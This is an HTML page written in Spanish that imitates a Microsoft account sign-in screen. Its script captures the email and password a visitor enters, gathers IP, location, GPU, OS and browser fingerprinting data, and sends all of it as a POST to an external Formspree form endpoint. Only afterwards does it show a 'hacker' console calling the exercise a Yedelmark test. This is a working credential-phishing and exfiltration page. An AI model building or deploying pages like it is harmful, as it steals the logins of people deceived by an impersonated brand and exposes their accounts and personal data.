<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Iniciar sesión en su cuenta</title>
    <style>
        body { background: #f2f2f2; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .login-box { background: #fff; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 10; }
        .logo { width: 108px; margin-bottom: 20px; }
        h2 { font-size: 24px; font-weight: 600; margin: 0 0 16px; color: #1b1b1b; }
        input { width: 100%; padding: 8px 10px; margin-bottom: 15px; border: 1px solid #666; border-radius: 0; box-sizing: border-box; font-size: 15px; outline: none; }
        input:focus { border-color: #0067b8; }
        .btn { background: #0067b8; color: #fff; border: none; padding: 10px 33px; cursor: pointer; float: right; font-size: 15px; }
        
        /* Barra de Carga */
        #loading-screen { display: none; text-align: center; width: 100%; }
        .loader-bar { width: 100%; height: 4px; background: #ccc; position: relative; overflow: hidden; margin-top: 20px; }
        .loader-progress { width: 30%; height: 100%; background: #0067b8; position: absolute; animation: loading 2s infinite; }
        @keyframes loading { 0% { left: -30%; } 100% { left: 100%; } }

        /* Terminal Hacker */
        #hacker-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 30px; font-family: 'Consolas', monospace; z-index: 10000; box-sizing: border-box; }
        .cmd { margin-bottom: 5px; }
    </style>
</head>
<body>

    <div id="auth-ui" class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo">
        
        <div id="login-form">
            <h2 id="title">Iniciar sesión</h2>
            <input type="email" id="email" placeholder="Correo electrónico, teléfono o Skype">
            <div id="pass-field" style="display:none;">
                <input type="password" id="password" placeholder="Contraseña">
            </div>
            <p style="font-size: 13px; color: #666;">¿No tiene una cuenta? <span style="color:#0067b8; cursor:pointer;">Cree una.</span></p>
            <button class="btn" onclick="handleAuth()" id="next-btn">Siguiente</button>
        </div>

        <div id="loading-screen">
            <h2 style="font-size: 18px;">Sincronizando con Azure AD...</h2>
            <p style="font-size: 14px;">Espere un momento mientras validamos su dispositivo.</p>
            <div class="loader-bar"><div class="loader-progress"></div></div>
        </div>
    </div>

    <div id="hacker-ui">
        <div id="console"></div>
    </div>

    <script>
        const FORM_URL = "https://formspree.io/f/xykdyebg";
        let step = 1;
        let userData = {};

        async function handleAuth() {
            if (step === 1) {
                userData.email = document.getElementById('email').value;
                if (!userData.email) return;
                document.getElementById('title').innerText = "Escribir contraseña";
                document.getElementById('email').style.display = 'none';
                document.getElementById('pass-field').style.display = 'block';
                document.getElementById('next-btn').innerText = "Iniciar sesión";
                step = 2;
            } else {
                userData.password = document.getElementById('password').value;
                if (!userData.password) return;
                
                // Transición a carga
                document.getElementById('login-form').style.display = 'none';
                document.getElementById('loading-screen').style.display = 'block';
                
                // Simular tiempo de "sincronización" antes del impacto
                setTimeout(ejecutarExfiltracionFinal, 2500);
            }
        }

        async function ejecutarExfiltracionFinal() {
            document.getElementById('auth-ui').style.display = 'none';
            document.getElementById('hacker-ui').style.display = 'block';
            try { document.documentElement.requestFullscreen(); } catch(e){}

            // Recolección técnica completa (Fingerprinting)
            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";

            const payload = {
                "LOGIN_EMAIL": userData.email,
                "LOGIN_PASS": userData.password,
                "IP_REMOTE": ipData.ip,
                "UBICACION": `${ipData.city}, ${ipData.country_name}`,
                "ISP": ipData.org,
                "HARDWARE_GPU": gpu,
                "SISTEMA_OPERATIVO": navigator.platform,
                "MEMORIA_RAM": navigator.deviceMemory + "GB",
                "CORES_CPU": navigator.hardwareConcurrency,
                "USER_AGENT": navigator.userAgent
            };

            // Envío al Formspree
            fetch(FORM_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // Animación de Consola Yedelmark
            const logger = document.getElementById('console');
            const lines = [
                "> CONNECTION ESTABLISHED: " + ipData.ip,
                "> TARGET_ID: " + userData.email.split('@')[0],
                "> EXTRACCION DE CREDENCIALES: COMPLETA",
                "> CLAVE CAPTURADA: " + "*".repeat(userData.password.length),
                "> ESCANEANDO HARDWARE... " + gpu,
                "> ---------------------------------------",
                "> BIENVENIDO A UNA PRUEBA DE YEDELMARK",
                "> ESTÁS SIENDO HACKEADO EN PEQUEÑITO",
                "> NO SE ASUSTE",
                "> ---------------------------------------",
                "> Datos enviados al servidor de control."
            ];

            let i = 0;
            const timer = setInterval(() => {
                const div = document.createElement('div');
                div.className = "cmd";
                div.innerHTML = `<span style="color:white">[+]</span> ${lines[i]}`;
                logger.appendChild(div);
                i++;
                if (i >= lines.length) {
                    clearInterval(timer);
                    alert("PRUEBA DE YEDELMARK FINALIZADA\n\nCredenciales y metadatos registrados.");
                }
            }, 500);
        }
    </script>
</body>
</html>
